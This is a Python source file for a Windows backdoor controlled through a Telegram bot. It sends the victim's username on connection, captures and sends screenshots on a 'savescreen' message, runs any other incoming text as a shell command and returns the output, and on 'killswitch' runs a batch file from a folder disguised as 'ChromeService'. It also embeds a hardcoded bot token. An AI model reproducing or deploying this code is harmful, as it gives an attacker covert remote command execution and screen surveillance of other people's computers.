from telegram.ext import Updater,CommandHandler,MessageHandler,Filters
import os
import pyautogui

TOKEN = "5913616404:AAFW9HlRZqCEmh3EgBe8pOfVayRiz_zxvPM"

def start(update,context):
    username = ""
    req = os.popen("echo %username%")

    for us in req:
        username+= us

    update.message.reply_text(f"Connection Established => {username} PC")

def answer(update,context):
    testo = update.message.text.lower()

    if "savescreen" in testo:

        img = pyautogui.screenshot()
        img.save("photo.png")

        update.message.reply_photo(open("photo.png","rb"))
    
    elif "killswitch" in testo:
        update.message.reply_text("Backdoor Deleted !")

        os.system("move C:\\Users\\%username%\\AppData\\Local\\Programs\\ChromeService\\updater.bat C:\\Users\\%username%\\AppData\\Local\\Programs\\")
        os.system("C:\\Users\\%username%\\AppData\\Local\\Programs\\updater.bat")
        
    else:
        try:
                
            command = ""
            response = os.popen(testo)

            msg = update.message.reply_text("Command is Executing....")
            
            for line in response:
                command+= line
            
            msg.edit_text(command)
        
        except Exception:
            msg.edit_text("Command NOT Valid !")
        
updater = Updater(TOKEN)
updater.dispatcher.add_handler(CommandHandler('start', start))
updater.dispatcher.add_handler(MessageHandler(Filters.text, answer))
print("Bot is listening....")
updater.start_polling()